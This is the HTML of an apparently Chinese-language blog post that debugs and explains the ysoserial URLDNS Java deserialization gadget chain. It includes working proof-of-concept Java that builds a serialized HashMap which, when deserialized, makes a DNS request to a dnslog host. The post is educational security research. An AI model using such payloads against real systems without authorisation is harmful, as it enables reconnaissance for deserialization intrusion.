@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="以 URLDNS 作为 ysoserial 调试分析的开端，调试环境 JDK 1.8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ysoserial URLDNS 调试分析">
+<meta property="og:url" content="http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="M13n&#39;s Blog">
+<meta property="og:description" content="以 URLDNS 作为 ysoserial 调试分析的开端，调试环境 JDK 1.8">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220004120328.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220190534777.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220221530254.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220221646405.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220221745111.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220222049798.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201225170639641.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201225170954916.png">
+<meta property="article:published_time" content="2020-12-19T16:27:28.000Z">
+<meta property="article:modified_time" content="2021-02-11T12:01:04.835Z">
+<meta property="article:author" content="M13n">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220004120328.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ysoserial URLDNS 调试分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&text=ysoserial URLDNS 调试分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=ysoserial URLDNS 调试分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&is_video=false&description=ysoserial URLDNS 调试分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ysoserial URLDNS 调试分析&body=Check out this article: http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=ysoserial URLDNS 调试分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=ysoserial URLDNS 调试分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=ysoserial URLDNS 调试分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=ysoserial URLDNS 调试分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&name=ysoserial URLDNS 调试分析&description=&lt;p&gt;以 URLDNS 作为 ysoserial 调试分析的开端，调试环境 JDK 1.8 &lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&t=ysoserial URLDNS 调试分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#About-URLDNS"><span class="toc-number">1.</span> <span class="toc-text">About URLDNS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#URLDNS-POC-Analyse"><span class="toc-number">2.</span> <span class="toc-text">URLDNS POC Analyse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Code"><span class="toc-number">2.1.</span> <span class="toc-text">Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyse-DNS"><span class="toc-number">2.2.</span> <span class="toc-text">Analyse -DNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyse-hashcode"><span class="toc-number">2.3.</span> <span class="toc-text">Analyse - hashcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyse-ysoserial-POC"><span class="toc-number">2.4.</span> <span class="toc-text">Analyse - ysoserial POC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">3.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ysoserial URLDNS 调试分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">M13n's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-12-19T16:27:28.000Z" itemprop="datePublished">2020-12-20</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Java-Sec/">Java Sec</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Java/" rel="tag">Java</a>, <a class="tag-link-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>以 URLDNS 作为 ysoserial 调试分析的开端，调试环境 JDK 1.8 </p>
+<span id="more"></span>
+
+
+
+<h1 id="About-URLDNS"><a href="#About-URLDNS" class="headerlink" title="About URLDNS"></a>About URLDNS</h1><p>URLDNS 适用环境：</p>
+<ul>
+<li><p>不依赖第三方库</p>
+</li>
+<li><p>对无回显反序列化处通过 DNS 请求验证反序列化</p>
+</li>
+</ul>
+<p>执行效果：</p>
+<p>不执行命令，只发起一次 DNS 请求</p>
+<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220004120328.png" alt="image-20201220004120328"></p>
+<p>大致浏览其功能后归纳出以下几个问题：</p>
+<ol>
+<li>URLDNS 是怎么发起 DNS 请求的</li>
+<li>为什么能在一个反序列化利用点发起攻击，ysoserial 是怎么做的</li>
+<li>这种攻击和之前学的反序列化的重写 readObject 有什么区别</li>
+</ol>
+<p>下面进入分析流程</p>
+<h1 id="URLDNS-POC-Analyse"><a href="#URLDNS-POC-Analyse" class="headerlink" title="URLDNS POC Analyse"></a>URLDNS POC Analyse</h1><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p>ysoserial 给的利用链如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure>
+
+<p>ysoserial Code：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); </span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler);</span><br><span class="line">                ht.put(u, url); </span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); </span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于 ysoserial 除了核心利用代码之外涉及很多 ysoserial 工具本身的东西。因此把代码扣出来调试。</p>
+<p>这里引用 @啦啦0咯咯 师傅文中代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建一个键的类型为 URL， 值的类型为 String 的 hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        <span class="comment">// 上面泛型规定了键的类型，创建一个 URL 类</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://3n5nmt.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="comment">// hashCode是private修饰，因此反射调用 URL 类的成员变量</span></span><br><span class="line">        Field f = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        <span class="comment">// 修改权限</span></span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 0xdeadbeef 随便设置</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>);</span><br><span class="line">        <span class="comment">// URLDNS 随便设置</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;URLDNS&quot;</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Analyse-DNS"><a href="#Analyse-DNS" class="headerlink" title="Analyse -DNS"></a>Analyse -DNS</h2><p>首先回顾这个 POC 的功能 —— 发起 DNS 请求</p>
+<p>那么纵观代码可以发现的是除了 <code>ois.readObject();</code> 之外没有其他的敏感操作了。</p>
+<p>思考一下 Java 反序列化漏洞的核心我们不难得知，这段代码一定重写了 <code>readObject</code>。那么向上追溯是哪里重写了  <code>readObject</code> 呢？</p>
+<p><code>java.util.HashMap#readObject</code>  中 <code>putVal(hash(key), key, value, false, false);</code> </p>
+<ul>
+<li>这里主要关注 <code>(hash(key)</code></li>
+</ul>
+<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220190534777.png" alt="image-20201220190534777"></p>
+<p><code>java.util.HashMap#hash</code></p>
+<ul>
+<li>操作意义具体看：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/20733617">https://www.zhihu.com/question/20733617</a></li>
+<li>主要跟进 <code>key.hashCode()</code></li>
+</ul>
+<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220221530254.png" alt="image-20201220221530254"></p>
+<p><code>java.net.URL#hashCode</code></p>
+<ul>
+<li>这里对 <code>hashCode</code> 有一个判断，要为 -1 才能去触发下面的语句</li>
+<li>后续进入 <code>handler.hashCode() </code>, <code>handler</code> 来源于  <code>transient URLStreamHandler handler;</code> </li>
+</ul>
+<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220221646405.png" alt="image-20201220221646405"></p>
+<p><code>java.net.URLStreamHandler#hashCode</code></p>
+<ul>
+<li>这里触发关键的方法 <code>getHostAddress</code></li>
+</ul>
+<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220221745111.png" alt="image-20201220221745111"></p>
+<p><code>java.net.URLStreamHandler#getHostAddress</code></p>
+<ul>
+<li>这⾥ <code>InetAddress.getByName(host)</code> 的作⽤是根据主机名，获取其IP地址。所以变相等于了DNS查询</li>
+</ul>
+<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201220222049798.png" alt="image-20201220222049798"></p>
+<p>后面为更深的调用栈</p>
+<h2 id="Analyse-hashcode"><a href="#Analyse-hashcode" class="headerlink" title="Analyse - hashcode"></a>Analyse - hashcode</h2><p>这里主要分析 POC 这段代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">f.set(url, <span class="number">0xdeadbeef</span>);</span><br><span class="line">hashMap.put(url, <span class="string">&quot;URLDNS&quot;</span>);</span><br><span class="line">f.set(url, -<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>核心是一个 <code>hashCode</code> 在不同场景下值的问题</p>
+<p>控制变量法：先把 <code>f.set(url, 0xdeadbeef);</code> 删除</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// URLDNS POC</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    ···</span><br><span class="line">        hashMap.put(url, <span class="string">&quot;URLDNS&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">** java.util.HashMap#put</span></span><br><span class="line"><span class="comment">** 这里关注下面的代码</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">** java.util.HashMap#hash</span></span><br><span class="line"><span class="comment">** 这里关注下面的代码</span></span><br><span class="line"><span class="comment">** 可见到了之前分析触发 DNS 的代码</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">** java.util.HashMap#hash</span></span><br><span class="line"><span class="comment">** 这里 hashCode 为 -1，会触发后续的调用</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">** java.net.URLStreamHandler#hashCode</span></span><br><span class="line"><span class="comment">** 这里 hashCode 为 -1，会触发后续的调用</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    ···</span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">** java.net.URLStreamHandler#getHostAddress</span></span><br><span class="line"><span class="comment">** 这里触发 DNS 请求 ！ 但注意！！！ 这里仅仅是在构造的时候触发的 DNS 请求</span></span><br><span class="line"><span class="comment">** 并非反序列化过程中触发！并非反序列化过程中触发！并非反序列化过程中触发！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    ···</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>经过上面的分析我们知道 <code>f.set(url, 0xdeadbeef);</code> 的作用就是避免在生成 POC 的时候触发额外的 DNS 请求，影响我们对反序列化漏洞验证的判断</p>
+<p>以我刚刚的例子为例，先看一下此时的 hashCode</p>
+<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201225170639641.png" alt="image-20201225170639641"></p>
+<p>接着我们刚刚的分析，再进行控制变量法：把 <code>f.set(url, -1);</code> 删除</p>
+<p>直接跳到关键地方，可以看到这里并不为 <code>-1</code> 因此不会进入后续触发 DNS 请求的语句</p>
+<p><img src="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/image-20201225170954916.png" alt="image-20201225170954916"></p>
+<p>因此我们得出结论：<code>f.set(url, -1);</code> 的关键作用是控制 <code>hashCode</code> 为 <code>-1</code> ，从而触发后续 DNS 请求</p>
+<h2 id="Analyse-ysoserial-POC"><a href="#Analyse-ysoserial-POC" class="headerlink" title="Analyse - ysoserial POC"></a>Analyse - ysoserial POC</h2><p>ysoserial 中相比于之前单纯的 POC，利用了一个独特的对象</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br></pre></td></tr></table></figure>
+
+<p>跟进 <code>ysoserial.payloads.URLDNS.SilentURLStreamHandler</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过重写 <code>getHostAddress</code> 的方式去避免在生成 POC 的时候发出 DNS 请求</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201762">https://www.anquanke.com/post/id/201762</a></p>
+<p><a target="_blank" rel="noopener" href="https://payloads.info/">https://payloads.info</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w">https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#About-URLDNS"><span class="toc-number">1.</span> <span class="toc-text">About URLDNS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#URLDNS-POC-Analyse"><span class="toc-number">2.</span> <span class="toc-text">URLDNS POC Analyse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Code"><span class="toc-number">2.1.</span> <span class="toc-text">Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyse-DNS"><span class="toc-number">2.2.</span> <span class="toc-text">Analyse -DNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyse-hashcode"><span class="toc-number">2.3.</span> <span class="toc-text">Analyse - hashcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyse-ysoserial-POC"><span class="toc-number">2.4.</span> <span class="toc-text">Analyse - ysoserial POC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">3.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&text=ysoserial URLDNS 调试分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=ysoserial URLDNS 调试分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&is_video=false&description=ysoserial URLDNS 调试分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ysoserial URLDNS 调试分析&body=Check out this article: http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=ysoserial URLDNS 调试分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=ysoserial URLDNS 调试分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=ysoserial URLDNS 调试分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
